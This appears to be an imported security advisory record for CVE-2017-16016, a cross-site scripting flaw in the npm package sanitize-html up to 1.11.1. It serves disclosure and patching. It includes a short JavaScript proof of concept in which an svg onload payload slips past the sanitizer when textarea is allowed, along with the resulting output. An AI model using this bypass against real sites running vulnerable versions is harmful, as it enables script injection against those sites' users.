advisory_id: GHSA-xc6g-ggrc-qq4r
datasource_id: github_osv_importer_v2/GHSA-xc6g-ggrc-qq4r
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2018/11/GHSA-xc6g-ggrc-qq4r/GHSA-xc6g-ggrc-qq4r.json
aliases:
  - CVE-2017-16016
summary: |
  Cross-Site Scripting in sanitize-html
  Affected versions of `sanitize-html` are vulnerable to cross-site scripting when allowedTags includes at least one `nonTextTag`.

  ## Proof of Concept

  ```js
  var sanitizeHtml = require('sanitize-html');

  var dirty = '!<textarea>&lt;/textarea&gt;<svg/onload=prompt`xs`&gt;</textarea>!';
  var clean = sanitizeHtml(dirty, {
      allowedTags: [ 'textarea' ]
  });

  console.log(clean);

  // !<textarea></textarea><svg/onload=prompt`xs`></textarea>!
  ```


  ## Recommendation

  Update to version 1.11.4 or later.
impacted_packages:
  - purl: pkg:npm/sanitize-html
    affected_versions: vers:npm/<=1.11.1
    fixed_versions: vers:npm/1.11.4
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-79
references:
  - url: https://github.com/advisories/GHSA-xc6g-ggrc-qq4r
    reference_type:
    reference_id:
  - url: https://github.com/punkave/sanitize-html/commit/5d205a1005ba0df80e21d8c64a15bb3accdb2403
    reference_type:
    reference_id:
  - url: https://github.com/punkave/sanitize-html/commit/5d205a1005ba0df80e21d8c64a15bb3accdb2403)))
    reference_type:
    reference_id:
  - url: https://github.com/punkave/sanitize-html/issues/100
    reference_type:
    reference_id:
  - url: https://npmjs.com/package/sanitize-html#discarding-the-entire-contents-of-a-disallowed-tag
    reference_type:
    reference_id:
  - url: https://www.npmjs.com/advisories/154
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2017-16016
    reference_type:
    reference_id: CVE-2017-16016
